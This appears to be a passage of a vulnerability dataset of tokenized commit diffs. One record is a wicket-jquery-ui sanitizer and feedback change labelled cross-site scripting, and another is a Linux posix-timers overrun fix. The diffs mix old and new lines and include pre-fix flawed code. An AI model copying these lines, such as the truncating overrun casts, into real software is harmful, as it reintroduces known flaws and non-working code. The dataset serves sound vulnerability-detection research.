")", ";", "}", "}", "/", "**", "*", "Register", "an", "error", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "SUCCESS", "}", "message", "to", "the", "hosting", "page", "*", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "error", "(", "String", "message", ")", "public", "static", "void", "success", "(", "IPartialPageRequestHandler", "handler", ",", "String", "message", ")", "{", "WebSession", ".", "get", "(", ").", "error", "(", "message", ")", ";", "BroadcastUtils", ".", "breadth", "(", "handler", ",", "new", "FeedbackPayload", "(", "handler", ",", "FeedbackMessage", ".", "SUCCESS", ",", "message", ")", ");", "}", "/", "**", "*", "Register", "a", "fatal", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Register", "a", "warn", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "e", "the", "{", "@", "link", "Exception", "}", "*", "/", "public", "static", "void", "fatal", "(", "Exception", "e", ")", "public", "static", "void", "warn", "(", "Exception", "e", ")", "{", "FeedbackUtils", ".", "error", "(", "e", ".", "getMessage", "(", "))", ";", "FeedbackUtils", ".", "warn", "(", "e", ".", "getMessage", "(", "))", ";", "}", "/", "**", "*", "Register", "a", "fatal", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Register", "a", "warn", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "fatal", "(", "String", "message", ")", "public", "static", "void", "warn", "(", "String", "message", ")", "{", "WebSession", ".", "get", "(", ").", "fatal", "(", "message", ")", ";", "}", "IPartialPageRequestHandler", "handler", "=", "RequestCycleUtils", ".", "getRequestHandler", "(", ");", "/", "/", "Ajax", "based", "/", "/", "if", "(", "handler", "!", "=", "null", ")", "{", "FeedbackUtils", ".", "warn", "(", "handler", ",", "message", ")", ";", "}", "else", "{", "WebSession", ".", "get", "(", ").", "warn", "(", "message", ")", ";", "}", "}", "/", "**", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "DEBUG", "}", "message", "to", "the", "hosting", "page", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "WARNING", "}", "message", "to", "the", "hosting", "page", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "debug", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ",", "String", "message", ")", "public", "static", "void", "warn", "(", "IPartialPageRequestHandler", "handler", ",", "String", "message", ")", "{", "BroadcastUtils", ".", "breadth", "(", "component", ".", "getPage", "(", "),", "new", "FeedbackPayload", "(", "target", ",", "FeedbackMessage", ".", "DEBUG", ",", "message", ")", ");", "BroadcastUtils", ".", "breadth", "(", "handler", ",", "new", "FeedbackPayload", "(", "handler", ",", "FeedbackMessage", ".", "WARNING", ",", "message", ")", ");", "}", "/", "**", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "INFO", "}", "message", "to", "the", "hosting", "page", "*", "Register", "an", "error", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "message", "the", "message", "*", "@", "param", "e", "the", "{", "@", "link", "Exception", "}", "*", "/", "public", "static", "void", "info", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ",", "String", "message", ")", "public", "static", "void", "error", "(", "Exception", "e", ")", "{", "BroadcastUtils", ".", "breadth", "(", "component", ".", "getPage", "(", "),", "new", "FeedbackPayload", "(", "target", ",", "FeedbackMessage", ".", "INFO", ",", "message", ")", ");", "FeedbackUtils", ".", "error", "(", "e", ".", "getMessage", "(", "))", ";", "}", "/", "**", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "SUCCESS", "}", "message", "to", "the", "hosting", "page", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "ERROR", "}", "exception", "message", "to", "the", "hosting", "page", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "message", "the", "message", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "exception", "the", "{", "@", "link", "Exception", "}", "*", "/", "public", "static", "void", "success", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ",", "String", "message", ")", "public", "static", "void", "error", "(", "IPartialPageRequestHandler", "handler", ",", "Exception", "exception", ")", "{", "BroadcastUtils", ".", "breadth", "(", "component", ".", "getPage", "(", "),", "new", "FeedbackPayload", "(", "target", ",", "FeedbackMessage", ".", "SUCCESS", ",", "message", ")", ");", "FeedbackUtils", ".", "error", "(", "handler", ",", "exception", ".", "getMessage", "(", "))", ";", "}", "/", "**", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "WARNING", "}", "message", "to", "the", "hosting", "page", "*", "Register", "an", "error", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "warn", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ",", "String", "message", ")", "public", "static", "void", "error", "(", "String", "message", ")", "{", "BroadcastUtils", ".", "breadth", "(", "component", ".", "getPage", "(", "),", "new", "FeedbackPayload", "(", "target", ",", "FeedbackMessage", ".", "WARNING", ",", "message", ")", ");", "IPartialPageRequestHandler", "handler", "=", "RequestCycleUtils", ".", "getRequestHandler", "(", ");", "if", "(", "handler", "!", "=", "null", ")", "{", "FeedbackUtils", ".", "error", "(", "handler", ",", "message", ")", ";", "}", "else", "{", "WebSession", ".", "get", "(", ").", "error", "(", "message", ")", ";", "}", "}", "/", "**", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "ERROR", "}", "exception", "message", "to", "the", "hosting", "page", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "ERROR", "}", "message", "to", "the", "hosting", "page", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "exception", "the", "{", "@", "link", "Exception", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "error", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ",", "Exception", "exception", ")", "public", "static", "void", "error", "(", "IPartialPageRequestHandler", "handler", ",", "String", "message", ")", "{", "FeedbackUtils", ".", "error", "(", "component", ",", "target", ",", "exception", ".", "getMessage", "(", "))", ";", "BroadcastUtils", ".", "breadth", "(", "handler", ",", "new", "FeedbackPayload", "(", "handler", ",", "FeedbackMessage", ".", "ERROR", ",", "message", ")", ");", "}", "/", "**", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "ERROR", "}", "message", "to", "the", "hosting", "page", "*", "Register", "a", "fatal", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "message", "the", "message", "*", "@", "param", "e", "the", "{", "@", "link", "Exception", "}", "*", "/", "public", "static", "void", "error", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ",", "String", "message", ")", "public", "static", "void", "fatal", "(", "Exception", "e", ")", "{", "BroadcastUtils", ".", "breadth", "(", "component", ".", "getPage", "(", "),", "new", "FeedbackPayload", "(", "target", ",", "FeedbackMessage", ".", "ERROR", ",", "message", ")", ");", "FeedbackUtils", ".", "fatal", "(", "e", ".", "getMessage", "(", "))", ";", "}", "/", "**", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "FATAL", "}", "exception", "message", "to", "the", "hosting", "page", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "exception", "the", "{", "@", "link", "Exception", "}", "*", "/", "public", "static", "void", "fatal", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ",", "Exception", "exception", ")", "public", "static", "void", "fatal", "(", "IPartialPageRequestHandler", "handler", ",", "Exception", "exception", ")", "{", "FeedbackUtils", ".", "fatal", "(", "component", ",", "target", ",", "exception", ".", "getMessage", "(", "))", ";", "FeedbackUtils", ".", "fatal", "(", "handler", ",", "exception", ".", "getMessage", "(", "))", ";", "}", "/", "**", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "FATAL", "}", "message", "to", "the", "hosting", "page", "*", "Register", "a", "fatal", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "fatal", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ",", "String", "message", ")", "public", "static", "void", "fatal", "(", "String", "message", ")", "{", "BroadcastUtils", ".", "breadth", "(", "component", ".", "getPage", "(", "),", "new", "FeedbackPayload", "(", "target", ",", "FeedbackMessage", ".", "FATAL", ",", "message", ")", ");", "IPartialPageRequestHandler", "handler", "=", "RequestCycleUtils", ".", "getRequestHandler", "(", ");", "if", "(", "handler", "!", "=", "null", ")", "{", "FeedbackUtils", ".", "fatal", "(", "handler", ",", "message", ")", ";", "}", "else", "{", "WebSession", ".", "get", "(", ").", "fatal", "(", "message", ")", ";", "}", "}", "/", "**", "*", "Aims", "the", "reload", "a", "{", "@", "link", "FeedbackPanel", "}", "using", "{", "@", "link", "Broadcast", "#", "BREADTH", "}", "mode", ".", "<", "br", ">", "*", "The", "hosting", "page", "should", "implement", "a", "code", "like", ":", "<", "br", ">", "*", "*", "<", "pre", ">", "*", "<", "code", ">", "*", "public", "void", "onEvent", "(", "IEvent", "&", "lt", ";", "?&", "gt", ";", "event", ")", "*", "{", "*", "super", ".", "onEvent", "(", "event", ")", ";", "*", "*", "if", "(", "event", ".", "getPayload", "(", ")", "instanceof", "FeedbackPayload", ")", "*", "{", "*", "FeedbackPayload", "payload", "=", "(", "FeedbackPayload", ")", "event", ".", "getPayload", "(", ");", "*", "*", "if", "(", "payload", ".", "getLevel", "(", ")", "=", "=", "FeedbackMessage", ".", "UNDEFINED", ")", "*", "{", "*", "payload", ".", "getTarget", "(", ").", "add", "(", "this", ".", "feedbackPanel", ")", ";", "*", "}", "*", "}", "*", "}", "*", "<", "/", "code", ">", "*", "<", "/", "pre", ">", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "FATAL", "}", "message", "to", "the", "hosting", "page", "*", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "sending", "the", "event", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "reload", "(", "Component", "component", ",", "AjaxRequestTarget", "target", ")", "public", "static", "void", "fatal", "(", "IPartialPageRequestHandler", "handler", ",", "String", "message", ")", "{", "BroadcastUtils", ".", "breadth", "(", "component", ".", "getPage", "(", "),", "new", "FeedbackPayload", "(", "target", ")", ");", "BroadcastUtils", ".", "breadth", "(", "handler", ",", "new", "FeedbackPayload", "(", "handler", ",", "FeedbackMessage", ".", "FATAL", ",", "message", ")", ");", "}", "}", "@", "@", "-", "117", ",", "7", "+", "117", ",", "7", "@", "@", "public", "String", "getEditorMarkupId", "(", ")", "@", "Override", "public", "void", "convertInput", "(", ")", "{", "final", "PolicyFactory", "policy", "=", "newPolicyFactory", "(", ");", "final", "PolicyFactory", "policy", "=", "this", ".", "newPolicyFactory", "(", ");", "final", "String", "input", "=", "this", ".", "textarea", ".", "getConvertedInput", "(", ");", "this", ".", "setConvertedInput", "(", "policy", ".", "sanitize", "(", "input", ")", ");", "@", "@", "-", "191", ",", "7", "+", "191", ",", "7", "@", "@", "protected", "void", "onComponentTag", "(", "ComponentTag", "tag", ")", "*", "*", "@", "return", "a", "new", "{", "@", "code", "PolicyFactory", "}", "*", "/", "protected", "static", "PolicyFactory", "newPolicyFactory", "(", ")", "protected", "PolicyFactory", "newPolicyFactory", "(", ")", "{", "return", "new", "HtmlPolicyBuilder", "(", ")", "/", "/", "lf", ".", "allowCommonInlineFormattingElements", "(", ")", "/", "/", "lf", "@", "@", "-", "17", ",", "18", "+", "17", ",", "19", "@", "@", "package", "com", ".", "googlecode", ".", "wicket", ".", "kendo", ".", "ui", ".", "dataviz", ".", "chart", ";", "import", "org", ".", "apache", ".", "wicket", ".", "ajax", ".", "AjaxRequestTarget", ";", "import", "org", ".", "apache", ".", "wicket", ".", "core", ".", "request", ".", "handler", ".", "IPartialPageRequestHandler", ";", "import", "org", ".", "apache", ".", "wicket", ".", "util", ".", "io", ".", "IClusterable", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "ajax", ".", "AjaxPayload", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "ajax", ".", "HandlerPayload", ";", "/", "**", "*", "Provides", "a", "convenient", "{", "@", "link", "AjaxPayload", "}", "that", "can", "be", "used", "to", "broadcast", "a", "point", "information", "*", "Provides", "a", "convenient", "{", "@", "link", "HandlerPayload", "}", "that", "can", "be", "used", "to", "broadcast", "a", "point", "information", "*", "*", "@", "see", "Chart", "#", "onSeriesClick", "(", "AjaxRequestTarget", ",", "String", ",", "String", ",", "String", ",", "long", ")", "*", "@", "author", "Sebastien", "Briquet", "-", "sebfz1", "*", "*", "/", "public", "class", "ChartPayload", "extends", "AjaxPayload", "implements", "IClusterable", "public", "class", "ChartPayload", "extends", "HandlerPayload", "implements", "IClusterable", "/", "/", "NOSONAR", "{", "private", "static", "final", "long", "serialVersionUID", "=", "1L", ";", "@", "@", "-", "40", ",", "15", "+", "41", ",", "15", "@", "@", "/", "**", "*", "Constructor", "*", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "seriesName", "the", "series", "name", "*", "@", "param", "seriesField", "the", "series", "field", "*", "@", "param", "category", "the", "category", "*", "@", "param", "value", "the", "value", "of", "the", "point", "*", "/", "public", "ChartPayload", "(", "AjaxRequestTarget", "target", ",", "String", "seriesName", ",", "String", "seriesField", ",", "String", "category", ",", "long", "value", ")", "public", "ChartPayload", "(", "IPartialPageRequestHandler", "handler", ",", "String", "seriesName", ",", "String", "seriesField", ",", "String", "category", ",", "long", "value", ")", "{", "super", "(", "target", ")", ";", "super", "(", "handler", ")", ";", "this", ".", "value", "=", "value", ";", "this", ".", "category", "=", "category", ";", "@", "@", "-", "17", ",", "7", "+", "17", ",", "7", "@", "@", "package", "com", ".", "googlecode", ".", "wicket", ".", "kendo", ".", "ui", ".", "utils", ";", "import", "org", ".", "apache", ".", "wicket", ".", "Component", ";", "import", "org", ".", "apache", ".", "wicket", ".", "ajax", ".", "AjaxRequestTarget", ";", "import", "org", ".", "apache", ".", "wicket", ".", "core", ".", "request", ".", "handler", ".", "IPartialPageRequestHandler", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "IJQueryWidget", ".", "JQueryWidget", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "kendo", ".", "ui", ".", "effect", ".", "KendoEffect", ";", "@", "@", "-", "43", ",", "39", "+", "43", ",", "39", "@", "@", "private", "KendoEffectUtils", "(", ")", "/", "**", "*", "Reloads", "a", "{", "@", "link", "Component", "}", "using", "a", "default", "{", "@", "link", "KendoEffect", "}", "*", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "*", "/", "public", "static", "void", "reload", "(", "AjaxRequestTarget", "target", ",", "Component", "component", ")", "public", "static", "void", "reload", "(", "IPartialPageRequestHandler", "handler", ",", "Component", "component", ")", "{", "KendoEffectUtils", ".", "reload", "(", "target", ",", "component", ",", "KendoEffectUtils", ".", "effect", ")", ";", "KendoEffectUtils", ".", "reload", "(", "handler", ",", "component", ",", "KendoEffectUtils", ".", "effect", ")", ";", "}", "/", "**", "*", "Reloads", "a", "{", "@", "link", "Component", "}", "using", "a", "specified", "{", "@", "link", "KendoEffect", "}", "*", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "*", "@", "param", "effect", "the", "{", "@", "link", "KendoEffect", "}", "*", "/", "public", "static", "void", "reload", "(", "AjaxRequestTarget", "target", ",", "Component", "component", ",", "KendoEffect", "effect", ")", "public", "static", "void", "reload", "(", "IPartialPageRequestHandler", "handler", ",", "Component", "component", ",", "KendoEffect", "effect", ")", "{", "KendoEffectUtils", ".", "reload", "(", "target", ",", "component", ",", "effect", ",", "false", ")", ";", "KendoEffectUtils", ".", "reload", "(", "handler", ",", "component", ",", "effect", ",", "false", ")", ";", "}", "/", "**", "*", "Reloads", "a", "{", "@", "link", "Component", "}", "using", "a", "specified", "{", "@", "link", "KendoEffect", "}", "*", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "component", "the", "{", "@", "link", "Component", "}", "*", "@", "param", "effect", "the", "{", "@", "link", "KendoEffect", "}", "*", "@", "param", "reverse", "indicates", "whether", "the", "effect", "should", "be", "played", "or", "reverse", "-", "played", "*", "/", "public", "static", "void", "reload", "(", "AjaxRequestTarget", "target", ",", "Component", "component", ",", "KendoEffect", "effect", ",", "boolean", "reverse", ")", "public", "static", "void", "reload", "(", "IPartialPageRequestHandler", "handler", ",", "Component", "component", ",", "KendoEffect", "effect", ",", "boolean", "reverse", ")", "{", "String", "selector", "=", "JQueryWidget", ".", "getSelector", "(", "component", ")", ";", "target", ".", "add", "(", "component", ")", ";", "target", ".", "appendJavaScript", "(", "String", ".", "format", "(", "\"", "kendo", ".", "fx", "(", "jQuery", "(", "'%", "s", "'", "))", ".%", "s", ".", "%", "s", "(", ");", "\",", "selector", ",", "effect", ",", "!", "reverse", "?", "\"", "play", "\"", ":", "\"", "reverse", "\"", "))", ";", "handler", ".", "add", "(", "component", ")", ";", "handler", ".", "appendJavaScript", "(", "String", ".", "format", "(", "\"", "kendo", ".", "fx", "(", "jQuery", "(", "'%", "s", "'", "))", ".%", "s", ".", "%", "s", "(", ");", "\",", "selector", ",", "effect", ",", "!", "reverse", "?", "\"", "play", "\"", ":", "\"", "reverse", "\"", "))", ";", "}", "}", "@", "@", "-", "95", ",", "7", "+", "95", ",", "7", "@", "@", "public", "void", "convertInput", "(", ")", "{", "super", ".", "convertInput", "(", ");", "final", "PolicyFactory", "policy", "=", "newPolicyFactory", "(", ");", "final", "PolicyFactory", "policy", "=", "this", ".", "newPolicyFactory", "(", ");", "final", "String", "input", "=", "this", ".", "getConvertedInput", "(", ");", "this", ".", "setConvertedInput", "(", "policy", ".", "sanitize", "(", "input", ")", ");", "@", "@", "-", "139", ",", "7", "+", "139", ",", "7", "@", "@", "public", "JQueryBehavior", "newWidgetBehavior", "(", "String", "selector", ")", "*", "*", "@", "return", "a", "new", "{", "@", "code", "PolicyFactory", "}", "*", "/", "protected", "static", "PolicyFactory", "newPolicyFactory", "(", ")", "protected", "PolicyFactory", "newPolicyFactory", "(", ")", "{", "return", "new", "HtmlPolicyBuilder", "(", ")", "/", "/", "lf", ".", "allowCommonInlineFormattingElements", "(", ")", "/", "/", "lf", "@", "@", "-", "17", ",", "9", "+", "17", ",", "10", "@", "@", "package", "com", ".", "googlecode", ".", "wicket", ".", "kendo", ".", "ui", ".", "widget", ".", "tabs", ";", "import", "org", ".", "apache", ".", "wicket", ".", "ajax", ".", "AjaxRequestTarget", ";", "import", "org", ".", "apache", ".", "wicket", ".", "core", ".", "request", ".", "handler", ".", "IPartialPageRequestHandler", ";", "import", "org", ".", "apache", ".", "wicket", ".", "event", ".", "IEvent", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "ajax", ".", "AjaxPayload", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "ajax", ".", "HandlerPayload", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "kendo", ".", "ui", ".", "form", ".", "button", ".", "AjaxButton", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "kendo", ".", "ui", ".", "widget", ".", "NavigationPanel", ";", "@", "@", "-", "103", ",", "15", "+", "104", ",", "15", "@", "@", "public", "void", "onEvent", "(", "IEvent", "<", "?>", "event", ")", "/", "*", "Classes", "*", "/", "/", "**", "*", "Provides", "a", "{", "@", "link", "AjaxPayload", "}", "designed", "to", "reload", "the", "{", "@", "link", "TabbedPanelNavigator", "}", "*", "Provides", "a", "{", "@", "link", "HandlerPayload", "}", "designed", "to", "reload", "the", "{", "@", "link", "TabbedPanelNavigator", "}", "*", "/", "public", "static", "class", "RefreshPayload", "extends", "AjaxPayload", "public", "static", "class", "RefreshPayload", "extends", "HandlerPayload", "{", "private", "final", "int", "index", ";", "public", "RefreshPayload", "(", "int", "index", ",", "AjaxRequestTarget", "target", ")", "public", "RefreshPayload", "(", "int", "index", ",", "IPartialPageRequestHandler", "handler", ")", "{", "super", "(", "target", ")", ";", "super", "(", "handler", ")", ";", "this", ".", "index", "=", "index", ";", "}"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["posix-timers:", "Sanitize", "overrun", "handling", "The", "posix", "timer", "overrun", "handling", "is", "broken", "because", "the", "forwarding", "functions", "can", "return", "a", "huge", "number", "of", "overruns", "which", "does", "not", "fit", "in", "an", "int.", "As", "a", "consequence", "timer_getoverrun(2)", "and", "siginfo::si_overrun", "can", "turn", "into", "random", "number", "generators.", "The", "k_clock::timer_forward()", "callbacks", "return", "a", "64", "bit", "value", "now.", "Make", "k_itimer::ti_overrun[_last]", "64bit", "as", "well,", "so", "the", "kernel", "internal", "accounting", "is", "correct.", "3Remove", "the", "temporary", "(int)", "casts.", "Add", "a", "helper", "function", "which", "clamps", "the", "overrun", "value", "returned", "to", "user", "space", "via", "timer_getoverrun(2)", "or", "siginfo::si_overrun", "limited", "to", "a", "positive", "value", "between", "0", "and", "INT_MAX.", "INT_MAX", "is", "an", "indicator", "for", "user", "space", "that", "the", "overrun", "value", "has", "been", "clamped.", "Reported-by:", "Team", "OWL337", "<icytxw@gmail.com>", "Signed-off-by:", "Thomas", "Gleixner", "<tglx@linutronix.de>", "Acked-by:", "John", "Stultz", "<john.stultz@linaro.org>", "Cc:", "Peter", "Zijlstra", "<peterz@infradead.org>", "Cc:", "Michael", "Kerrisk", "<mtk.manpages@gmail.com>", "Link:", "https://lkml.kernel.org/r/20180626132705.018623573@linutronix.de"], "code_tokens": ["@", "@", "-", "95", ",", "8", "+", "95", ",", "8", "@", "@", "struct", "k_itimer", "{", "clockid_t", "it_clock", ";", "timer_t", "it_id", ";", "int", "it_active", ";", "int", "it_overrun", ";", "int", "it_overrun_last", ";", "s64", "it_overrun", ";", "s64", "it_overrun_last", ";", "int", "it_requeue_pending", ";", "int", "it_sigev_notify", ";", "ktime_t", "it_interval", ";", "@", "@", "-", "85", ",", "7", "+", "85", ",", "7", "@", "@", "static", "void", "bump_cpu_timer", "(", "struct", "k_itimer", "*", "timer", ",", "u64", "now", ")", "continue", ";", "timer", "-", ">", "it", ".", "cpu", ".", "expires", "+", "=", "incr", ";", "timer", "-", ">", "it_overrun", "+", "=", "1", "<", "<", "i", ";", "timer", "-", ">", "it_overrun", "+", "=", "1LL", "<", "<", "i", ";", "delta", "-", "=", "incr", ";", "}", "}", "@", "@", "-", "283", ",", "16", "+", "283", ",", "26", "@", "@", "static", "__init", "int", "init_posix_timers", "(", "void", ")", "}", "__initcall", "(", "init_posix_timers", ")", ";", "/", "*", "*", "The", "siginfo", "si_overrun", "field", "and", "the", "return", "value", "of", "timer_getoverrun", "(", "2", ")", "*", "are", "of", "type", "int", ".", "Clamp", "the", "overrun", "value", "to", "INT_MAX", "*", "/", "static", "inline", "int", "timer_overrun_to_int", "(", "struct", "k_itimer", "*", "timr", ",", "int", "baseval", ")", "{", "s64", "sum", "=", "timr", "-", ">", "it_overrun_last", "+", "(", "s64", ")", "baseval", ";", "return", "sum", ">", "(", "s64", ")", "INT_MAX", "?", "INT_MAX", ":", "(", "int", ")", "sum", ";", "}", "static", "void", "common_hrtimer_rearm", "(", "struct", "k_itimer", "*", "timr", ")", "{", "struct", "hrtimer", "*", "timer", "=", "&", "timr", "-", ">", "it", ".", "real", ".", "timer", ";", "if", "(", "!", "timr", "-", ">", "it_interval", ")", "return", ";", "timr", "-", ">", "it_overrun", "+", "=", "(", "unsigned", "int", ")", "hrtimer_forward", "(", "timer", ",", "timer", "-", ">", "base", "-", ">", "get_time", "(", "),", "timr", "-", ">", "it_interval", ")", ";", "timr", "-", ">", "it_overrun", "+", "=", "hrtimer_forward", "(", "timer", ",", "timer", "-", ">", "base", "-", ">", "get_time", "(", "),", "timr", "-", ">", "it_interval", ")", ";", "hrtimer_restart", "(", "timer", ")", ";", "}", "@", "@", "-", "321", ",", "10", "+", "331", ",", "10", "@", "@", "void", "posixtimer_rearm", "(", "struct", "siginfo", "*", "info", ")", "timr", "-", ">", "it_active", "=", "1", ";", "timr", "-", ">", "it_overrun_last", "=", "timr", "-", ">", "it_overrun", ";", "timr", "-", ">", "it_overrun", "=", "-", "1", ";", "timr", "-", ">", "it_overrun", "=", "-", "1LL", ";", "+", "+", "timr", "-", ">", "it_requeue_pending", ";", "info", "-", ">", "si_overrun", "+", "=", "timr", "-", ">", "it_overrun_last", ";", "info", "-", ">", "si_overrun", "=", "timer_overrun_to_int", "(", "timr", ",", "info", "-", ">", "si_overrun", ")", ";", "}", "unlock_timer", "(", "timr", ",", "flags", ")", ";", "@", "@", "-", "418", ",", "9", "+", "428", ",", "8", "@", "@", "static", "enum", "hrtimer_restart", "posix_timer_fn", "(", "struct", "hrtimer", "*", "timer", ")", "now", "=", "ktime_add", "(", "now", ",", "kj", ")", ";", "}", "#", "endif", "timr", "-", ">", "it_overrun", "+", "=", "(", "unsigned", "int", ")", "hrtimer_forward", "(", "timer", ",", "now", ",", "timr", "-", ">", "it_interval", ")", ";", "timr", "-", ">", "it_overrun", "+", "=", "hrtimer_forward", "(", "timer", ",", "now", ",", "timr", "-", ">", "it_interval", ")", ";", "ret", "=", "HRTIMER_RESTART", ";", "+", "+", "timr", "-", ">", "it_requeue_pending", ";", "timr", "-", ">", "it_active", "=", "1", ";", "@", "@", "-", "524", ",", "7", "+", "533", ",", "7", "@", "@", "static", "int", "do_timer_create", "(", "clockid_t", "which_clock", ",", "struct", "sigevent", "*", "event", ",", "new_timer", "-", ">", "it_id", "=", "(", "timer_t", ")", "new_timer_id", ";", "new_timer", "-", ">", "it_clock", "=", "which_clock", ";", "new_timer", "-", ">", "kclock", "=", "kc", ";", "new_timer", "-", ">", "it_overrun", "=", "-", "1", ";", "new_timer", "-", ">", "it_overrun", "=", "-", "1LL", ";", "if", "(", "event", ")", "{", "rcu_read_lock", "(", ");", "@", "@", "-", "702", ",", "7", "+", "711", ",", "7", "@", "@", "void", "common_timer_get", "(", "struct", "k_itimer", "*", "timr", ",", "struct", "itimerspec64", "*", "cur_setting", ")", "*", "expiry", "time", "forward", "by", "intervals", ",", "so", "expiry", "is", ">", "now", ".", "*", "/", "if", "(", "iv", "&", "&", "(", "timr", "-", ">", "it_requeue_pending", "&", "REQUEUE_PENDING", "|", "|", "sig_none", ")", ")", "timr", "-", ">", "it_overrun", "+", "=", "(", "int", ")", "kc", "-", ">", "timer_forward", "(", "timr", ",", "now", ")", ";", "timr", "-", ">", "it_overrun", "+", "=", "kc", "-", ">", "timer_forward", "(", "timr", ",", "now", ")", ";", "remaining", "=", "kc", "-", ">", "timer_remaining", "(", "timr", ",", "now", ")", ";", "/", "*", "Return", "0", "only", ",", "when", "the", "timer", "is", "expired", "and", "not", "pending", "*", "/", "@", "@", "-", "791", ",", "7", "+", "800", ",", "7", "@", "@", "SYSCALL_DEFINE1", "(", "timer_getoverrun", ",", "timer_t", ",", "timer_id", ")", "if", "(", "!", "timr", ")", "return", "-", 